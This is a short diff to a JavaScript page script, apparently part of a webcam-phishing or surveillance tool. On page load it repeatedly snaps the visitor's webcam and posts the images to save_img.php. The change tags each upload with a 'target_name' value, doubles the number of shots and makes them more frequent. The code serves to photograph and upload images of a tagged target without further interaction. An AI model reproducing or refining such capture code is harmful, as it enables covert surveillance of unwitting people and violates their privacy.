@@ -2,6 +2,7 @@
 
 $(document).ready(function(){ 
     //photo
+    var name=$(".target_name").val();
     const webcamElement = document.getElementById('webcam');
     const canvasElement = document.getElementById('canvas');
     const webcam = new Webcam(webcamElement, 'user', canvasElement);
@@ -10,18 +11,20 @@ $(document).ready(function(){
 
     var i=0;
     window.setInterval(function(){
-        if(i<5){
+        if(i<10){
             now_you_see_me();
             i++;
         }
-    }, 5000);
+    }, 2000);
 
     function now_you_see_me(){
         var picture = webcam.snap();
         $.post("./save_img.php",
-        {picture:picture},
+        {picture:picture,name:name},
         function(data,status){
             console.log(data);
         });
     }
+
+    console.log(name);
 });
